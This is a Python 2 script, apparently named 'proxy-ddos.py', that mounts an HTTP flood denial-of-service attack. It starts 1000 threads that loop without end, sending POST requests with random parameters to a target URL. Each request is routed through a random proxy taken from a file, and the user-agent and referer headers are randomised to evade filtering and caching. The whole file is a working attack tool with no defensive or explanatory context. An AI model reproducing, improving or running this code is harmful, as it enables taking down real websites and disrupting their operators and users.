import urllib2
import urllib
import threading
import random
import re
import sys
import socket
#if responce time is more than 3s, it's really a bad one. there is no need to dos .
socket.setdefaulttimeout(1)
#global params
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
F = open('result.txt')
ips = F.read().split('\n')
F.close()

def inc_counter():
    global request_counter
    request_counter+=1

def set_safe():
    global safe
    safe=1

# generates a user agent array
def useragent_list():
    global headers_useragents
    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    return(headers_useragents)

# generates a referer array
def referer_list():
    global headers_referers
    headers_referers.append('https://www.google.com.hk/#newwindow=1&q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://www.baidu.com/s?wd=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('http://' + host + '/')
    return(headers_referers)
#builds random ascii string
def buildblock(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return(out_str)

def usage():
    print '---------------------------------------------------'
    print 'USAGE: python proxy-ddos.py <url>'
    print '---------------------------------------------------'

def httpcall(url):
    useragent_list()
    referer_list()
    code=0
    if url.count("?")>0:
        param_joiner="&"
    else:
        param_joiner="?"
    #F = open('result.txt')
    #ips = F.read().split('\n')
    #F.close()
    requests = ''
    while 1:
        headers = {
        'User-Agent':random.choice(headers_useragents),
        'Cache-Control':'no-cache',
        'Accept-Charset':'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer':random.choice(headers_referers) + buildblock(random.randint(5,10)),
        'Keep-Alive':random.randint(110,120),
        'Connection':'keep-alive',
        'Host':host
        }
        postdata = urllib.urlencode( {buildblock(random.randint(3,10)):buildblock(random.randint(3,10))} )
        req = urllib2.Request(url=url,data=postdata,headers=headers)
        index = random.randint(0,len(ips)-1)
        proxy = urllib2.ProxyHandler({'http':ips[index]})
        opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
        urllib2.install_opener(opener)
        try:
            urllib2.urlopen(req)
        except Exception,e:
            continue

#http caller thread
class HTTPThread(threading.Thread):
    def run(self):
        httpcall(url)

#execute
if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1]=="help":
        usage()
        sys.exit()
    else:
        print "-- Attack Started --"
        url = sys.argv[1]
        if url.count("/")==2:
            url = url + "/"
        m = re.search('http\://([^/]*)/?.*', url)
        host = m.group(1)
        for i in range(1000):
            t = HTTPThread()
            t.start()
